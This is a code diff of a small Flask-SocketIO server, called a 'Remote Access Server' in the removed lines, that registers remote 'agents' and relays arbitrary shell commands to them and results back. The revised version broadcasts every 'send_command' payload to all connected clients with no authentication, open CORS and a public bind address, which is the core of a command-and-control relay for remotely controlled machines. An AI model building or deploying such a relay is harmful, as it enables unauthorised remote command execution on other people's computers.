@@ -3,58 +3,49 @@ from flask_socketio import SocketIO, emit
 import time
 
 app = Flask(__name__)
-socketio = SocketIO(app, cors_allowed_origins="*")
+socketio = SocketIO(app, cors_allowed_origins="*", allow_unsafe_werkzeug=True)
 
-# Simple storage
-agents = {}
-sessions = {}
+agents = []
 
 @app.route('/')
 def home():
-    return f"""
-    <h1>Remote Access Server</h1>
-    <p>Status: <strong style='color:green'>Online</strong></p>
-    <p>Active Agents: {len(agents)}</p>
-    <p>Active Sessions: {len(sessions)}</p>
-    """
+    return f"Active Agents: {len(agents)}"
 
 @socketio.on('connect')
 def connect():
-    print("New connection")
+    print("Client connected")
 
 @socketio.on('register')
 def register(data):
     agent_id = data.get('agent_id')
-    agents[agent_id] = request.sid
-    emit('registered', {'status': 'ok'})
-    print(f"Agent registered: {agent_id}")
+    if agent_id and agent_id not in agents:
+        agents.append(agent_id)
+        emit('registered', {'status': 'ok'})
+        emit('agent_online', {'agent_id': agent_id}, broadcast=True)
+        print(f"Agent registered: {agent_id}")
 
 @socketio.on('get_agents')
-def list_agents():
-    emit('agents_list', {'agents': list(agents.keys())})
+def get_agents():
+    emit('agents_list', {'agents': agents})
 
-@socketio.on('connect_to')
-def connect_to(data):
+@socketio.on('connect_agent')
+def connect_agent(data):
     agent_id = data.get('agent_id')
     if agent_id in agents:
-        session_id = f"sess_{int(time.time())}"
-        sessions[session_id] = agent_id
-        emit('session_created', {'session_id': session_id})
-        emit('new_connection', {'session_id': session_id}, room=agents[agent_id])
+        emit('connected', {'agent_id': agent_id})
 
-@socketio.on('command')
-def command(data):
-    session_id = data.get('session_id')
-    cmd = data.get('command')
-    if session_id in sessions:
-        agent_id = sessions[session_id]
-        emit('execute', {'command': cmd}, room=agents[agent_id])
+@socketio.on('send_command')
+def send_command(data):
+    emit('execute', {'command': data.get('command')}, broadcast=True)
 
 @socketio.on('result')
 def result(data):
-    session_id = data.get('session_id')
-    output = data.get('output')
-    emit('command_output', {'output': output}, room=session_id)
+    emit('result', data, broadcast=True)
+
+@socketio.on('disconnect')
+def disconnect():
+    print("Client disconnected")
 
 if __name__ == '__main__':
-    socketio.run(app, host='0.0.0.0', port=5000, allow_unsafe_werkzeug=True)
+    print("Simple Server Starting...")
+    socketio.run(app, host='0.0.0.0', port=5000)
